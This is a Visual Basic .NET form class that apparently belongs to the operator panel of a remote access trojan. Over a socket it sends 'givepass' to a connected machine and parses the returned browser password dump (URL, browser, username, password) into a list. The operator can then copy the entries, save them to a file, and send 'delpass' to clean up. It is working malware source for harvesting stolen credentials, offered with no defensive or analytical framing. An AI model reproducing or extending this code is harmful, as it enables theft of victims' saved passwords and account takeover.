Public Class passwords


    Public sock As Integer
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean


     
    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click

        Main.S.Send(sock, "delpass")
        Me.Close()
    End Sub



#End Region

    Private Sub passwords_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor

        Timer1.Start()


    End Sub
    Dim CurrH As Double = 0.0
    '773; 497
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If CurrH < 496 Then
            CurrH += 49.7
            Me.Size = New Size(Me.Width, CurrH)
        Else
            Timer1.Stop()
            Button1.PerformClick()

        End If
    End Sub
    Friend Sub Return_To_List()
         Dim Currentx As String = RichTextBox1.Text.Replace("==================================================", "")
        RichTextBox1.Text = Currentx
        Dim Currenty As String = RichTextBox1.Text.Replace("               ", "")
        RichTextBox1.Text = Currenty
        Dim Currents As String = RichTextBox1.Text.Replace("       ", "")
        RichTextBox1.Text = Currents
        Dim Currentz As String = RichTextBox1.Text.Replace("         ", "")
        RichTextBox1.Text = Currentz
        Dim Currentb As String = RichTextBox1.Text.Replace("          ", "")
        RichTextBox1.Text = Currentb
        '          '''
        For i As Integer = 0 To RichTextBox1.Lines.Length - 1
            If RichTextBox1.Lines(i).Contains("Field") Then
                Dim Current As String = RichTextBox1.Text.Replace(RichTextBox1.Lines(i).ToString, "")
                RichTextBox1.Text = Current
            End If

            If RichTextBox1.Lines(i).Contains("URL") Then
                Dim index As Integer = Return_Browser_index(RichTextBox1.Lines(i + 1).Replace("Web Browser", "").Replace(":", ""))
                Dim PasswordElement = ListView1.Items.Add(RichTextBox1.Lines(i).Replace("URL", "").Replace(":", ""), index)

                If RichTextBox1.Lines(i + 1).Contains("Web Browser") Then

                    PasswordElement.SubItems.Add(RichTextBox1.Lines(i + 1).Replace("Web Browser", "").Replace(":", ""))
                End If
                If RichTextBox1.Lines(i + 2).Contains("User Name") Then
                    PasswordElement.SubItems.Add(RichTextBox1.Lines(i + 2).Replace("User Name", "").Replace(":", ""))
                End If
                If RichTextBox1.Lines(i + 3).Contains("Password") Then
                    PasswordElement.SubItems.Add(RichTextBox1.Lines(i + 3).Replace("Password", "").Replace(":", ""))

                End If
                If RichTextBox1.Lines(i + 4).Contains("Password Strength") Then
                    PasswordElement.SubItems.Add(RichTextBox1.Lines(i + 4).Replace("Password Strength", "").Replace(":", ""))

                End If
            End If

        Next
        SpeakThread("Here is all stored passwords Sir")
    End Sub
  
   
    Private Function Return_Browser_index(ByVal browsername As String) As Integer
        '1 chrome , 2 Explorer , 3 Firefox , 0 key icon
        If browsername.Contains("chrome") Or browsername.Equals("Chrome") Or browsername.Contains("hrome") Then
            Return 1
        ElseIf browsername.Contains("Explorer") Or browsername.Contains("xplorer") Then
            Return 2
        ElseIf browsername.Contains("Fire") Or browsername.Contains("fox") Or browsername.Contains("Fox") Or browsername.Contains("ox") Then
            Return 3
        Else
            Return 0
        End If
    End Function
    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Main.S.Send(sock, "givepass")

    End Sub
    Private Sub Save()
        Dim o As New SaveFileDialog
        o.Filter = "Txtpass|*.Txt"
        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each ll As ListViewItem In ListView1.Items
                My.Computer.FileSystem.WriteAllText(o.FileName, RichTextBox1.Text, True)
            Next
            MsgBox("Saving Passwords Done", MsgBoxStyle.Information, "")
        End If
    End Sub

    Private Sub OpenUrlToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenUrlToolStripMenuItem.Click
        Dim url As String = ListView1.SelectedItems(0).SubItems(0).Text
        Process.Start(url)
    End Sub

    Private Sub SaveAllToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SaveAllToolStripMenuItem.Click
        Save()
    End Sub

    Private Sub CopyUserNameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CopyUserNameToolStripMenuItem.Click
        Dim user As String = ListView1.SelectedItems(0).SubItems(2).Text
        TextBox1.Text = user
        Label2.Text = "Username"
    End Sub

    Private Sub CopyPasswordToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CopyPasswordToolStripMenuItem.Click
        Dim pass As String = ListView1.SelectedItems(0).SubItems(3).Text
        TextBox1.Text = pass
        Label2.Text = "Password"
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        Main.S.Send(sock, "givepass")
    End Sub
End Class